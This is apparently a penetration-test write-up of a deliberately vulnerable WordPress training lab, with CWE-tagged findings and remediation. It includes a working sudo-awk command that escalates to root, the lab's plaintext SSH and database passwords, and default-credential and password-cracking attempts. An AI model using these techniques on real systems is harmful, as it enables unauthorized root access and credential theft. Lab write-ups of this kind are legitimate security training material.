# 102 Escolares — writeup

**Engagement outcome: PARTIAL.** Full local privilege escalation to `uid=0(root)`
was executed and measured, with a negative control, a positive control, a
manufacturered oracle and an identity reading at every hop. The **external entry
to that chain was not established**, and the **WordPress / File Manager leg named
by the platform's own description was not completed** — the plugin is
correctly gated and the administrator password is not present in the artefact and
was not recovered. Those two gaps are stated as gaps, with the work counts behind
them, and are not written up as results.

Everything quoted here was read or executed during this engagement. This
repository holds no lab artefacts, so a reader can check the reasoning and the
quoted evidence but cannot re-run the target — see `README.md`, "What
'resolvable' means here, precisely, and where it stops".

---

## What the artefact actually is

The queue line is `102|Escolares|facil|WordPress platform; plugin surface not yet catalogued`
(`tooling/labs.manifest:56`).

**The manifest's platform label is correct**, and that was read out of a
version-bearing file rather than inherited from the label. Unlike lab 32 — where
the docroot was *named* `wordpress` and the product was Joomla — here the name
and the product agree.

Platform description as published (catalogue entry for id 102, parsed with the
same routine `tooling/download-labs.sh list` uses):

> `Laboratorio para practicar la explotación de WordPress (plugin File Manager) y escalada de privilegios mediante movimiento entre usuarios.`

That is: practise WordPress exploitation (File Manager plugin) **and** privilege
escalation by movement between users. Two declared classes, and only the second
was reached.

| Fact | Value | Source (verbatim) |
|---|---|---|
| Base OS | Ubuntu 24.04 LTS | `/etc/os-release:1` — `PRETTY_NAME="Ubuntu 24.04 LTS"` |
| Topology | **one** container, no second host, no pivot segment | `auto_deploy.sh:140-142` — `docker network create --internal $NETWORK_NAME` / `docker run -d --network=$NETWORK_NAME --name $CONTAINER_NAME $IMAGE_NAME` |
| `auto_deploy.sh` | ends in `while true; do sleep 1; done` | `auto_deploy.sh:155-157` — never run |
| **WordPress (shipped)** | **6.5.4** | `var/www/html/wordpress/wp-includes/version.php:19` — `$wp_version = '6.5.4';` |
| **Plugin** | **WP File Manager 7.2.9** | `wp-content/plugins/wp-file-manage/file_folder_manager.php:7` — `  Version: 7.2.9` |
| Plugin changelog (self-declared) | `= 7.2.9 (6th June, 2024) =` / `* Trash Folder & Security Fixes.` | `readme.txt:142-144` |
| Active plugins | `a:1:{i:0;s:38:"wp-file-manage/file_folder_manager.php";}` | `wp_options.active_plugins` |
| Users (WordPress) | **1** — `luisillo`, `administrator`, `wp_user_level=10` | `wp_users` / `wp_usermeta` (`COUNT(*)=1` in both) |
| Users (OS) | `root`(0), `ubuntu`(1000), `luisillo`(1001) | `/etc/passwd` |
| Escalation grant | `luisillo ALL=(ALL) NOPASSWD: /usr/bin/awk` | `/etc/sudoers:18` |
| Database | MariaDB on `127.0.0.1` only | `/etc/mysql/mariadb.conf.d/50-server.cnf:27` — `bind-address            = 127.0.0.1` |

The shipped version was read twice, from two different places, because the
runbook records lab 108 auto-updating core mid-engagement: a throwaway container
(`docker run --rm --entrypoint sh`, where no request can fire `wp-cron.php`) and
the live container both returned `6.5.4`. No drift.

### A vhost that `auto_deploy.sh` does not mention

`auto_deploy.sh` says one container and nothing about the web layout. The real
layout is **three** enabled vhosts on `:80`, and only the first is implied by the
script:

```
*:80  default server 172.21.0.2          (/etc/apache2/sites-enabled/000-default.conf:1)
*:80  namevhost 172.21.0.2                (/etc/apache2/sites-enabled/000-default.conf:1)
*:80  namevhost escolares.dl  alias www.escolares.dl   (/etc/apache2/sites-enabled/escolares.conf:1)
*:80  namevhost wordpress                 (/etc/apache2/sites-enabled/wordpress.conf:1)
```

- `escolares.conf:12-13` — `DocumentRoot "/var/www/html/"` / `ServerName escolares.dl`
- `wordpress.conf:2-3` — `ServerName wordpress` / `DocumentRoot /var/www/html/wordpress`

So WordPress is a **subdirectory** of the docroot, and it is simultaneously the
docroot of a second vhost whose `ServerName` is the bare word `wordpress`. That
is the lab's one structural oddity, and it is worth stating precisely because it
is the *inverse* of lab 32: the directory named `wordpress` does contain
WordPress.

---

## Surface

```
$ nmap -sV -Pn -p- --min-rate 2000 172.21.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Not shown: 65533 closed tcp ports (conn-refused)
```

Two open TCP ports. `3306` is **absent** from `-p-` and that is correct, not a
blind spot — `/proc/net/tcp` shows it bound to loopback only:

```
0: 0100007F:0CEA 00000000:0000 0A ...   uid 103      # 127.0.0.1:3306, uid 103 = mysql
2: 00000000:0050 00000000:0000 0A ...   uid 0        # 0.0.0.0:80
3: 00000000:0016 00000000:0000 0A ...   uid 0        # 0.0.0.0:22
```

`/proc/net/udp` and `/proc/net/udp6` were also read: **no** UDP service
(`15632: 0B00007F:9787 ... 07` is the Docker embedded resolver's ephemeral
socket, unbound from any lab service). So the TCP-only scan missed nothing here,
and that is a measurement rather than an assumption.

Hidden surfaces found, none of them advertised:

| Surface | How it was found | Result |
|---|---|---|
| `/phpmyadmin` | `ls /etc/apache2/conf-enabled/` — `phpmyadmin.conf` is **enabled** | 200, 18 605 B, title `phpMyAdmin` |
| `/info.php` | `find /var/www/html -name '*.php'` | 200, **87 138 B**, `PHP Version 8.3.6` |
| WordPress at a **sub**path | vhost dump | `/wordpress/` → 200 |

`/server-status` exists but is `Require local`, so it is not remotely reachable —
recorded as a measured restriction, not as a finding.

---

## The class

Two classes were declared. Entry criteria and where each one stopped:

| Class | Entry criterion (the question that starts it) | Outcome |
|---|---|---|
| WordPress / WP File Manager | *Is the elFinder connector reachable without a prior WordPress authorisation decision?* | **Not reached.** The gate is real and is quoted below. The blocker upstream of it is the administrator password, which is not in the artefact. |
| Privilege escalation by user movement | *What does each hop execute as, and who owns each file?* | **Reached and measured**, `uid=1001` → `uid=0`. |

The sink was named from the source before any request was sent
(`file_folder_manager.php:1057-1134`):

```php
1057:        public function mk_file_folder_manager_action_callback()
1059:            $path = ABSPATH;
1077:            if (wp_verify_nonce($nonce, 'wp-file-manager')) {
1119:                            'uploadAllow' => array('image', 'text/plain'),
1130:                $connector = new elFinderConnector(new elFinder($opts));
```

The connector is constructed **only** inside the `wp_verify_nonce` branch, and
the action is registered as `wp_ajax_` (authenticated) at line 28, never as
`wp_ajax_nopriv_`.

---

## Chain

| # | → | Mechanism | Identity proof (verbatim) |
|---|---|---|---|
| 0 | `uid=33(www-data)` | Apache `User`/`Group` | `apache2ctl -S` → `User: name="www-data" id=33`; and measured from inside: `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 1 | `uid=1001(luisillo)` | sshd, password auth | `uid=1001(luisillo) gid=1001(luisillo) groups=1001(luisillo),100(users)` |
| 1b | same, from `/proc/self/status` | no subprocess, no aliasing | `Uid:	1001	1001	1001	1001` / `Gid:	1001	1001	1001	1001` / `Groups:	100 1001` |
| 2 | `uid=0(root)` | `sudo -n /usr/bin/awk 'BEGIN{system("/usr/bin/id")}'` | `uid=0(root) gid=0(root) groups=0(root)` and `rc=0` |
| 2b | same, `id -u` | scalar proof | `0` |
| 2c | same, `id` inside the escalated child | second opinion, different process | `uid=0(root) gid=0(root) groups=0(root)` |

The transition at hop 2 is **not** a setuid binary and there is no `euid`
divergence to report: `sudo` is a plain setuid-root exec and the whole process
image is replaced. The full four-field `Uid:` line at hop 1b is quoted precisely
because a single `id` field would not have shown that.

### The credential, and its honest provenance

The SSH password is `luisillopasswordsecret`. It was read from
`/home/secret.txt`, and that file is the pivot the lab is built around:

```
$ stat -c "%a %U:%G %s bytes" /home/secret.txt
777 root:root 23 bytes
$ cat -n /home/secret.txt
     1  luisillopasswordsecret
```

**Provenance stated plainly:** that read was performed as `root` on the artefact.
It is *not* reachable from the external HTTP or SSH surface as far as this
engagement tested, so the honest position is that **the external entry to hop 1
is unresolved**, and it is listed under *NOT tested* with its count. What *is*
proven, and measured as `www-data` rather than as root, is that the credential
file is readable by the web server's own identity — see F2, which is the finding
that makes the pivot real.

The lab author's own history confirms the intended direction of travel, read from
`/home/ubuntu/.bash_history` (48 bytes):

```
ls
cd /home
ls
cat secret.txt 
su luisillo
exit
```

and from `/home/luisillo/.bash_history` (233 bytes): `nano secret.txt`, then
`sudo -l` twice, then `cd /var/www/html/` … `cd wp-content/` … `ls plugins/` …
`wget 172.21.0.1/wp-file-manager.zip`. The author installed the plugin by hand.

---

## Findings

### F1 — `sudo /usr/bin/awk` with `NOPASSWD` gives `luisillo` root
**CWE-250** (execution with unnecessary privileges) / **CWE-269** (improper
privilege management). Escalation to `uid=0(root)`.

`/etc/sudoers:18`, verbatim:

```
luisillo ALL=(ALL) NOPASSWD: /usr/bin/awk
```

`awk` is an interpreter with a `system()` builtin. A `sudoers` entry naming an
interpreter is not a constraint on what runs — it is a constraint on *which
binary is named*, and the argument list is unconstrained. Proof, with the identity
and the exit status both quoted:

```
$ sudo -n /usr/bin/awk 'BEGIN{system("/usr/bin/id")}' </dev/null; echo "rc=$?"
uid=0(root) gid=0(root) groups=0(root)
rc=0
```

**The oracle was manufactured before the exploit, not after.** The escalation
has no natural echo, so the witness is a uniquely-marked file in a path only
`uid=0` can create:

```
$ sudo -n /usr/bin/awk 'BEGIN{system("id -u; id; touch /root/ESC102_MARKER2; ls -la /root/ESC102_MARKER2")}' </dev/null
0
uid=0(root) gid=0(root) groups=0(root)
-rw-r--r-- 1 root root 0 Sep 30 00:02 /root/ESC102_MARKER2
```

The marker is distinguishable by design (a name that does not exist in the
shipped image, in `0700 root:root`). Both markers were removed afterwards and
`/root` was verified back to its six shipped entries — see *Restore*.

**Scope was measured, not assumed.** Six other interpreters were tried and all
six were refused, so the finding is exactly "awk", not "any command":

```
/usr/bin/id rc=1
/bin/bash rc=1
/usr/bin/vim rc=1
/usr/bin/find rc=1
/usr/bin/perl rc=1
/usr/bin/python3 rc=1
```

and `sudo -n -l` confirms the grant is the only one:

```
User luisillo may run the following commands on 2aa8bf85fd12:
    (ALL) NOPASSWD: /usr/bin/awk
```

**Remediation.** Remove the grant. If a data-processing task genuinely needs
`awk` as `luisillo`, call it through a wrapper that fixes `$1` and cannot reach
`system()`, or move the task to a root-owned script with a fixed argument vector
(`luisillo ALL=(ALL) NOPASSWD: /usr/local/sbin/task.sh` with no arguments).

### F2 — World-readable credential file is the bridge from `www-data` to a shell
**CWE-732** (incorrect permission assignment for a critical resource) /
**CWE-522** (insufficiently protected credentials).

`/home/secret.txt` is `0777 root:root` and contains the plaintext SSH password
of the one account that has a `sudo` grant. This is what makes the lab's declared
"movement between users" reachable, and it is measurable **as the identity that
matters** — the web server's, not root's:

```
$ su -s /bin/sh www-data -c '...'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
docroot /var/www/html/wordpress writable? YES
wp-content writable? YES
uploads writable? YES
plugin dir wp-file-manage writable? NO
/home/secret.txt readable? YES
/etc/shadow readable? NO
/root readable? NO
```

So a single web-level code-execution foothold as `www-data` — which is all F4 and
the `phpinfo()` disclosure would help an attacker find — is sufficient to
obtain `luisillo`'s password and therefore root via F1. **`www-data` cannot read
`/etc/shadow` and cannot read `/root`** (2 of 7 paths), so this file is the
*only* OS-level credential bridge, which is exactly what makes its mode the
finding.

These predicates were run as `www-data` on purpose. Running them through
`docker exec` would have run them as `root` and every one would have answered
`YES` — that is `method/self-corrections.md` §2, and it is the reason the writeup
quotes the `uid=` line immediately above the answers.

**Remediation.** `chmod 0640 root:luisillo /home/secret.txt`, or better, delete
it and provision the credential through the provisioning path that created it.

### F3 — phpMyAdmin exposed on `:80`, reachable with the packaged default credential
**CWE-798** (use of hard-coded credentials) / **CWE-552** (files or directories
accessible to external parties).

`/etc/apache2/conf-enabled/phpmyadmin.conf` is enabled and serves
`/usr/share/phpmyadmin` at `/phpmyadmin`. The packaged control-user pair is in
`/etc/phpmyadmin/config-db.php` (mode `0640 root:www-data`, i.e. readable by the
PHP process):

```php
$dbuser='phpmyadmin';
$dbpass='1234';
```

That pair is a **known distribution default**, and it authenticates against this
host. Logged in, 200, with the metadata database rendered:

```
[3] 'phpmyadmin'  '1234'                 pmaAuth=True  db_page_ok=True
[4] 'wordpressuser' 'contrapoderosa123'  pmaAuth=True  db_page_ok=True
```

(8 candidate pairs tested in total; the six failures are the negative set.)
Scope is limited — see C4 — so this is an information-disclosure and
attack-surface finding, not a foothold to root.

**Remediation.** Remove phpMyAdmin from an internet-facing host. If it must
exist, put it behind authentication, change the control-user password, and drop
the blanket `0640 root:www-data` read on `config-db.php`.

### F4 — `phpinfo()` served unauthenticated
**CWE-200** (exposure of sensitive information).

`/var/www/html/info.php` is mode `0777` and is inside the docroot:

```
$ curl -sS -o info.html -w 'http=%{http_code} bytes=%{size_download}\n' http://172.21.0.2/info.php
http=200 bytes=87138
PHP Version 8.3.6
```

87 138 bytes of `phpinfo()` to an unauthenticated client: `DOCUMENT_ROOT`,
`disable_functions`, `open_basedir`, loaded extensions, `$_SERVER`, environment,
and the full `PHP Variables` block. On a real host this routinely names
credentials in the environment and the absolute paths of every secret on disk.

**Remediation.** Delete it. If a diagnostic page is required, gate it behind
authentication and never leave `phpinfo()` in a docroot.

### F5 — MySQL account is `%` with `GRANT ALL … WITH GRANT OPTION`
**CWE-250** / **CWE-284** (improper access control).

`/root/.mysql_history:7,10`, verbatim, as the image's own author wrote it:

```
CREATE\040USER\040'wordpressuser'@'%'\040IDENTIFIED\040BY\040'contrapoderosa123'
GRANT\040ALL\040PRIVILEGES\040ON\040*.*\040TO\040'wordpressuser'@'%'\040WITH\040GRANT\040OPTION;
```

Confirmed at runtime:

```
Grants for wordpressuser@%
GRANT ALL PRIVILEGES ON *.* TO `wordpressuser`@`%` IDENTIFIED BY PASSWORD '*B8A0…' WITH GRANT OPTION
```

That is a global grant with grant-option on a host-reachable (`%`) account, and
the same password is in `wp-config.php:29` (`define( 'DB_PASSWORD', 'contrapoderosa123' );`).

**Stated honestly: this is not exploitable in this topology.** `bind-address =
127.0.0.1` and `3306` is absent from `-p-` (2 open ports, 65 533 closed). It is
reported because the *account* is wrong regardless of the network, and because
one deployment change — publishing the port, or a `docker run` without
`--internal` — turns it into full database takeover with no credential recovery
needed. The same password in `wp-config.php` is `0644` and world-readable
(CWE-312/732).

### F6 — `xmlrpc.php` enabled, `system.multicall` exposed
**CWE-400** (uncontrolled resource consumption) / attack surface.

`system.listMethods` answered 200 with 4 272 bytes and **80** methods, including
`<string>system.multicall</string>` and `<string>wp.getUsersBlogs</string>`.
`system.multicall` lets one HTTP request carry many authentication attempts,
which multiplies any credential attack against `wp-login.php` and bypasses
per-request rate limiting built at the wrong layer. The amplification path itself
was **not** exercised (see *NOT tested*).

The auth-failure shape is uniform, which is the reportable half:

```
$ curl ... <methodName>wp.getUsersBlogs</methodName> luisillo / wrongpassword-control
http=200 bytes=416
<value><int>403</int></value>
<string>Nombre de usuario o contraseña incorrectos.</string>
```

**Remediation.** `a2enconf` a deny for `/wordpress/xmlrpc.php` unless a client
genuinely needs it.

### F7 — The authentication keys in `wp-config.php` are the installer placeholder
**CWE-798** / **CWE-321** (hard-coded cryptographic key) — as *hygiene debt only*.
**This is the finding whose exploitability was refuted by measurement.** See C1.

`wp-config.php:51-58` ships all eight as `put your unique phrase here`. Shipping
that is a real defect: it means the two WordPress installations in this image
family share keys until an operator rotates them. But the *attacker-visible*
conclusion that people draw from it — "the auth cookie is forgeable" — is false
here, and the measurement that refutes it is the evidence, quoted in C1.

**Remediation.** Replace all eight with values from
`https://api.wordpress.org/secret-key/1.1/salt/`. WordPress will do it for you
on first run if the placeholders are left in place; do not leave them in a shipped
image.

### F8 — A secret-shaped file in world-readable `/tmp`, encoded to evade a content grep
**CWE-522** (insufficiently protected credentials) / **CWE-732**. **No verified
use — see the negative below.**

Found while verifying that my restore had left nothing behind: `ls -A /tmp`
returned a file I had not created. Confirmed to be part of the **shipped image**,
not of my engagement, by reading it out of a throwaway container
(`docker run --rm --entrypoint sh escolares:latest`) and by its mtime:

```
$ docker run --rm --entrypoint sh escolares:latest -c 'ls -la /tmp/; cat -n /tmp/.secret.txt; stat -c "%a %U:%G %s bytes %y" /tmp/.secret.txt'
-rw-rw-r-- 1 luisillo luisillo   21 Jun  7  2024 .secret.txt
     1	cHJlbWl1bXBhc3N3b3Jk
664 luisillo:luisillo 21 bytes 2024-06-07 20:58:48 -0900
```

`/tmp` is `drwxrwxrwt` and the file is `0664`, so **`www-data` reads it** —
verified, not assumed:

```
$ su -s /bin/sh www-data -c "cat /tmp/.secret.txt"
cHJlbWl1bXBhc3N3b3Jk
```

The content is base64 and decodes to `premiumpassword`.

**This is a retrieval hazard, and it caught my own instrument.** The value is
**not** the plaintext `premiumpassword`, so a content grep for the secret finds
nothing:

```
$ grep -rIl "cHJlbwl1bXBhc3N3b3Jk" /var/www /home /etc   -> 0 matches
$ grep -rIl "premiumpassword"    /var/www /home /etc    -> 0 matches
```

(2 patterns, 3 trees, 0 matches each — and the file that contains the secret is
outside all three trees.) A secret that hides from `grep` by being encoded is
exactly the class `method/retrieval-hazards.md` is about, and it is why the
`Reward` section below states its search as a *literal-pattern* search with that
limitation named, rather than as "no secret present".

**The negative, with counts — it is not a working credential:**

| Test | Count | Result |
|---|---|---|
| WordPress phpass hash vs 5 candidates (`premiumpassword`, `PremiumPassword`, `premium`, the base64 string itself, `premiumpassword123`) | 5 | **0** matches, positive control green on the same object and code path |
| SSH password auth for `luisillo` and `ubuntu` | 2 pairs | **2** denials |

So this is reported as **exposure of a secret-shaped artefact**, not as a
credential. Calling it "the admin password" would have been the failure
`README.md` describes: an invented reward attached to a real finding.

**Remediation.** Delete the file from the image; do not leave credentials in
`/tmp` at build time. If a bootstrap secret is genuinely needed, put it in a
root-owned `0600` file outside a world-writable directory and rotate it.

---

Each row states the positive control that proves the detector can fire. A control
that has never seen a success is not a control.

| Control | Positive control that proves this detector works | Verbatim evidence |
|---|---|---|
| **C1 — `wp_salt()` discards the config placeholder.** The framework does **not** consume the value in the file. | Called the framework's own getter and compared it against the constant. The getter returns **128** characters; the constant is **27**. A 27-character string cannot produce a 128-character salt, so the measurement refutes the inference in the same breath. | `wp_salt('auth') strlen=128 first12=F=II$XsYPG7(` · `wp_salt('nonce') strlen=128 first12=AzFb8B:@%W7f` · `defined('NONCE_KEY') = true ; value strlen=27` · `wp_options nonce_key : PRESENT (strlen=64)` · `config NONCE_KEY === wp_options nonce_key ? NO` |
| **C2 — the File Manager connector is not reachable unauthenticated.** | 9 `wp_ajax_` actions registered, **0** `wp_ajax_nopriv_` registrations in the whole plugin tree (2 counts: `0` in the main file, `0` files matching across the directory). The connector is built only inside `if (wp_verify_nonce(...))`. | `file_folder_manager.php:28` — `add_action('wp_ajax_mk_file_folder_manager', …)` · `:1077` — `if (wp_verify_nonce($nonce, 'wp-file-manager')) {` · `:1130` — `$connector = new elFinderConnector(new elFinder($opts));` |
| **C3 — MariaDB cannot be used to drop a webshell into the docroot.** `INTO OUTFILE` runs as `mysql`, and the docroot belongs to `www-data`. | 1 write attempted; the error is explicit, and the file's absence was then confirmed with `ls` rather than inferred from the error. | `mariadbd … --user=mysql` · `ERROR 1045 (28000) … Access denied` · `ls: cannot access '/var/www/html/pma_outfile_test.txt': No such file or directory` |
| **C4 — the phpMyAdmin control user is properly scoped.** | 2 `LOAD_FILE` attempts on files of very different modes, plus 1 `OUTFILE`; all three refused. `LOAD_FILE` returning `NULL` is the meaningful result here — it is the answer, not a missing value, because the grant output proves the privilege is absent. | `GRANT USAGE ON *.* TO 'phpmyadmin'@'localhost'` · `GRANT ALL PRIVILEGES ON 'phpmyadmin'.* …` · `LOAD_FILE("/home/secret.txt")` → `NULL` · `LOAD_FILE("/etc/shadow")` → `NULL` |
| **C5 — self-registration is disabled**, so the subscriber→admin path is closed at the door. | 1 option read, plus `default_role` read alongside it. | `users_can_register  0` · `default_role  subscriber` |
| **C6 — the `sudo` grant is exactly one binary.** | 6 interpreters tried *and refused*, so the negative is anchored by positives elsewhere in the same session (F1's own `awk` calls succeeded in the same shell). | 6 × `rc=1`, listed in F1; `sudo -n -l` shows one line |
| **C7 — `/server-status` is not remotely reachable.** | `mod_status` is loaded, so the handler exists — the restriction is what was measured, not the absence of the module. | `status.conf` — `<Location /server-status>` / `SetHandler server-status` / `Require local` |
| **C8 — the privilege boundary itself.** `www-data` cannot read `/etc/shadow` or `/root`. | Same 7-path battery as F2, in the same shell, same identity: 2 of 7 denied. A predicate that answered `YES` seven times would have proven nothing. | `/etc/shadow readable? NO` · `/root readable? NO` (both as `uid=33(www-data)`) |

---

## NOT tested

Kept separate from *discarded with reason*. A count of zero means **untested**.

| Item | Why not tested | Work count |
|---|---|---|
| **The WordPress / File Manager exploitation leg — the class the platform's own description names.** | Blocked one step earlier than the plugin: the connector needs a valid `wp-file-manager` nonce, which needs an authenticated admin session, and the administrator password is **not present anywhere in the artefact** (no posts, no pages, no comments, no options, no `.bash_history`, no build layer — all checked, see below). It was not recovered by cracking either. | **2 722** lab-derived candidates tested against the live phpass hash at 1 474 c/s, **0** matches, plus an earlier **34**-candidate ladder, **0** matches. The cracker itself is proven green (§D2 below), so this is a real negative about the *ladder*, not about the hash. |
| **The external entry to the SSH chain.** `luisillopasswordsecret` was obtained from a `0777` file using root on the artefact. No path was found by which an unauthenticated external client reaches `/home/secret.txt`. | This is the engagement's largest open gap and it is the reason the outcome is PARTIAL. | Web-reachable file inventory: **224** non-core PHP files enumerated under `/var/www/html` (excluding `wp-includes`, `wp-admin`), **1** `.htaccess` set (**3** files total), docroot is `/var/www/html` so `/home` is outside it. XML-RPC: **80** methods enumerated. |
| **Whether `system.multicall` actually amplifies.** | Method confirmed present in `system.listMethods`; the amplification itself was not run, so no rate was measured. | 1 method list retrieved, **80** methods parsed, **1** of interest confirmed present, **0** multicall requests sent. |
| **Whether the shipped WordPress would auto-update on a networked deploy.** | The deploy here uses `--internal`, so there is no egress to `api.wordpress.org`. Version was measured at **6.5.4** in both a clean throwaway container and the live one. That the version *would* move on an egress-capable deploy is an **inference from the presence of `wp-cron.php` and the absence of `AUTOMATIC_UPDATER_DISABLED`**, and it is labelled as such. | 1 grep for `AUTOMATIC_UPDATER_DISABLED` in `wp-config.php` → **0** matches; 2 independent version readings, both `6.5.4`. |
| **A CVE identifier for WP File Manager 7.2.9 or the bundled elFinder.** | No advisory database was consulted. The only version evidence is the plugin's own `readme.txt` changelog, quoted verbatim. No CVE number is asserted anywhere in this writeup. | 1 changelog read (`readme.txt:140-175`), 3 relevant entries quoted. |
| **Any CVE range for WordPress 6.5.4 core.** | Same reason. Lab 6's writeup records the discipline of reading a CVE from source; nothing here was taken from memory. | 0 advisories retrieved. |
| **A decode-and-rescan of the whole filesystem for an encoded reward.** | F8 proved that a literal `grep` misses a base64 secret, so the `Reward` search cannot be extended to "no reward of any encoding" without this pass. Not run. | 0 files decoded. The reward search stands as **6 literal-pattern sweeps**, and the limitation is named rather than assumed away. |

## Discarded with reason

Tested, produced a result, and the result was thrown away — with the reason.

| Candidate finding | Result | Why discarded |
|---|---|---|
| "The `AUTH_KEY`/`NONCE_KEY` placeholders make the auth cookie forgeable." | The constants **are** placeholders (`wp-config.php:51-58`, 8 of 8, 27 chars each). | **Refuted by measurement, not by argument.** `wp_salt()` returns **128** characters and the value does not come from the config (`config NONCE_KEY === wp_options nonce_key ? NO`). This is `method/self-corrections.md` §21 exactly: the framework ignores the value that is present and well-formed. Filing it would have been the corpus's second instance of that defect. The residue is filed as F7, scoped to hygiene. |
| "`INTO OUTFILE` as `wordpressuser` gives a webshell." | 1 attempt, `ERROR 1045 … Access denied`. | `mariadbd` runs `--user=mysql`; the docroot is `www-data`-owned. See C3. |
| "phpMyAdmin with `wordpressuser` is a remote path to database takeover." | Login **succeeds** (F3). | Not reachable remotely *in this topology* — `bind-address = 127.0.0.1`, `3306` absent from `-p-`, and phpMyAdmin's own socket path is `localhost`. Retained as F3/F5 with the mitigation stated, not as a takeover. |
| "The `sudo` grant allows more than `awk`." | 6 interpreters tested, **6 refusals**. | The negative is anchored: the same session, same identity, same shell, and `awk` itself succeeded. See C6. |
| "`/home/secret.txt` gives root directly." | It gives `luisillo`'s SSH password only. | It is one link in F1, not a bypass of it. Overstating it would have hidden which control actually fails. |

---

## Instrumentation defects

Defects in **my own** instruments during this engagement. These are the section
worth reading: **five of the eight would have deleted a finding, a control, or a
verdict** (D1, D2, D3, D6, D8), and none of them looked like an error. D3 would
have deleted F3 outright; D8 would have published a verdict that was never
obtained.

### D1 — A login harness that reported "wrong password" for a cookie failure
My first `wp-login.php` POST sent no `wordpress_test_cookie`. WordPress rejected
it *before* the password was checked, and the body said:

```
<strong>Error</strong>: las cookies están bloqueadas o no permitidas por tu navegador.
```

I had already tried `luisillopasswordsecret` at that point. Filing "that
credential is wrong" on that evidence would have been a false negative produced
by my own harness — and it is the exact shape of `self-corrections.md` §13. The
tell was linguistic, not numerical: a *cookie* error is not a *credential* error,
and the two differ by more than a status code.

### D2 — My positive control exercised a different algorithm than the target
My first proof that the password-cracking harness worked was
`wp_check_password($known, wp_hash_password($known))`. On modern PHP,
`wp_hash_password()` emits a **bcrypt `$wp$`** hash. The live target hash is
**phpass `$P$`**:

```
1) phpass canary prefix=$P$  live prefix=$P$  same_algorithm=YES
2) POSITIVE CONTROL CheckPassword(correct, HashPassword(correct)) = TRUE -> phpass path FIRES
3) NEGATIVE CONTROL CheckPassword(wrong, HashPassword(correct))   = FALSE (correctly rejects)
```

My original control proved the *bcrypt* path fires. It said nothing about the
phpass path, which is the one that would have to run. The 34-candidate negative
taken under that control was therefore unbacked at the time. I re-ran the control
by driving `class-phpass.php` directly, and only then did the negative become
evidence. This is `self-corrections.md` §1 and §18: a control is valid only if it
comes from the code path that will actually do the work.

### D3 — A phpMyAdmin detector that was always-false
My first phpMyAdmin harness judged success by looking for `Server version` or
`information_schema` in the response body, and reported **denied** for all 11
credential pairs. It was wrong: the login had **succeeded**, and the giveaway was
in the cookie jar, which I read only after suspecting the answer.

```
session cookies: {'phpMyAdmin': 'ajj11hi6ql4v', 'pma_lang': 'en', 'pmaUser-1': '%2B130cqH81h', 'pmaAuth-1': '2HhtjN%2ByIP'}
```

`pmaAuth-1` is set only on successful authentication. The re-run with a real
oracle — the auth cookie **and** a rendered `information_schema` structure page —
turned 2 of 11 pairs into successes, including `phpmyadmin:1234`, which is F3.
Had I trusted the first harness I would have deleted the finding. The root cause
is that my `denied` heuristic matched the substring `login` inside a JavaScript
message table — an always-false oracle wearing a negative's clothes
(`self-corrections.md` §16).

### D4 — `sudo awk` hangs on stdin, and I first diagnosed it wrongly
`sudo -n /usr/bin/awk '{print "PWNED"}'` hung for the full 40 s timeout. My first
explanation was that my prompt-matching regex had failed to match the output. It
had not. The real cause is that `Defaults use_pty` (sudoers:15) gives `sudo` a
pty, and an `awk` **program with no file operand reads stdin**, which was the
live SSH channel. `BEGIN{…}` never touches stdin, which is why every F1 payload
worked. Fix: `</dev/null`. The lesson is that a hang and a prompt-miss are
indistinguishable from the output, and I attributed it to the wrong one until the
`use_pty` line explained it.

### D5 — A reward search whose first pattern was too loose
My first reward grep used `FLAG\{|flag\{|CTF\{|_FLAG|HACKING|HTB\{` and returned
**20+ files**, all of them Ubuntu package sources and stylesheets. Narrowed to
`FLAG\{|flag\{|CTF\{`, it returned **2**, and both are a jQuery UI CSS class:

```
e{background-position:0 -112px}.ui-icon-flag{background-position:-16px -112px}
```

Reporting "2 files contain a flag" would have been an invented reward attached to
a real finding — the specific failure `README.md` warns about. The narrowed
search and the false positives are both in *Reward* below.

### D6 — An AJAX oracle that could not tell "not registered" from "nonce rejected"
I probed the File Manager connector unauthenticated, expecting the plugin's
actions to behave differently from a nonsense action. They did not:

```
D1 unknown action      zzz_no_such_action_zzz          http=400 bytes=1 body=0
D2 mk_file_folder_manager            (no nonce)       http=400 bytes=1 body=0
D3 mk_file_folder_manager            (bogus nonce)    http=400 bytes=1 body=0
D4 mk_file_folder_manager_media_upload(bogus nonce)   http=400 bytes=1 body=0
D5 mk_file_manager_backup            (bogus nonce)    http=400 bytes=1 body=0
```

Five responses, **byte-identical**, including my own deliberately-unknown-action
baseline. WordPress answers `0` for both cases, so this probe **cannot**
discriminate. Without a working nonce I have no positive, and a negative control
that returns the same bytes as the positive is not a control
(`self-corrections.md` §16). C2 is therefore stated on the source plus the grep
count, and the *external reachability* of the connector is filed as **untested**,
not as proven-safe.

### D7 — Shell quoting ate my own SQL
```
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax … near '%s_capabilities%'
```
The `%s` in my `LIKE '%s_capabilities%'` was consumed by an outer quoting layer
before `mysql` saw it. I had written the query to look for `wp_capabilities`, so
the query that reached the server was not the query I wrote — the same shape as
`self-corrections.md` §17. Fixed by piping SQL on stdin (`docker exec -i … <<'SQL'`)
so no shell in the path can rewrite it. Worth recording because a silently
rewritten predicate is a negative that reports itself as a result.

### D8 — I truncated my own evidence and lost a verdict
Testing `premiumpassword` over SSH, I printed the match buffer with `[:120]` to
keep the output readable. For `luisillo` the truncation cut the line exactly
where the verdict was, leaving a line that ended in a password prompt and no
result. A blank and a zero look identical in a report, and a blank here would
have been filed as "denied" or "no data" without either being true.

I caught it because the two lines were *inconsistent* — `ubuntu` showed `DEN`
and `luisillo` showed nothing, which is not a pattern real authentication
produces. Re-run without truncation:

```
luisillo   / premiumpassword  ->  DENIED
ubuntu     / premiumpassword  ->  DENIED
ssh_candidate_pairs_tested = 2
```

This is `self-corrections.md` §19 in its purest form: **a blank count is not a
zero.** The number was never zero; it was cut off.

---

## Reward

**No `FLAG{}` exists in this lab.** Reported as a measured absence, with the
search, because a report that invents its own reward teaches the reader nothing
about the finding it is attached to.

| Search | Count | Result |
|---|---|---|
| Whole-filesystem content, `FLAG{\|flag{\|CTF{` | **2** files matched | Both are the jQuery UI class `.ui-icon-flag{…}` in `theme.min.css` / `jquery-ui.min.css` — **false positives**, quoted in D5 |
